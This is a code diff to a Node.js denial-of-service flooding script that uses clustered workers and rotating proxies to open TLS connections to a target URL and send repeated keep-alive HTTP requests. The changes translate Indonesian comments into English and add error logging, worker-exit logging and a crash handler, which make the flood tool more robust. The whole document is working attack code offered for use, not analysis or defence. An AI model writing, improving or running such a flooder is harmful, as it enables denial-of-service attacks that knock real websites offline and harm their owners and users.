@@ -34,10 +34,15 @@ if (cluster.isMaster) {
         console.log("Attack completed.");
         process.exit(0);
     }, duration * 1000);
+
+    // Log when workers exit
+    cluster.on('exit', (worker, code, signal) => {
+        console.log(`Worker ${worker.process.pid} exited with code ${code}`);
+    });
 } else {
     const target = new URL(targetURL);
     let proxyIndex = 0;
-    const startTime = Date.now(); // Simpan waktu mulai serangan
+    const startTime = Date.now(); // Save the start time of the attack
 
     function sendTLSRequest(proxy, callback) {
         const proxyParts = proxy.trim().split(":");
@@ -68,13 +73,14 @@ if (cluster.isMaster) {
                                     "Connection: keep-alive\r\n\r\n";
                     client.write(request);
                 }
-                setTimeout(flood, 100); // Delay mikro agar CPU tidak overload
+                setTimeout(flood, 100); // Micro delay to avoid overloading the CPU
             }
             flood();
             callback(true);
         });
 
-        client.on("error", () => {
+        client.on("error", (err) => {
+            console.error(`TLS connection error: ${err.message}`);
             client.destroy();
             callback(false);
         });
@@ -101,11 +107,17 @@ if (cluster.isMaster) {
         sendTLSRequest(proxy, (success) => {
             if (!success) {
                 console.warn(`Removing dead proxy: ${proxy}`);
-                proxies = proxies.filter(p => p !== proxy); // Hapus proxy mati
+                proxies = proxies.filter(p => p !== proxy); // Remove dead proxy
             }
-            setTimeout(attackLoop, 50); // Delay mikro agar CPU lebih stabil
+            setTimeout(attackLoop, 50); // Micro delay for more stable CPU usage
         });
     }
+
+    // Add uncaught exception handler to prevent worker crashes
+    process.on('uncaughtException', (err) => {
+        console.error('Uncaught exception:', err);
+        process.exit(1);  // Ensure worker terminates after an uncaught exception
+    });
 
     attackLoop();
 }
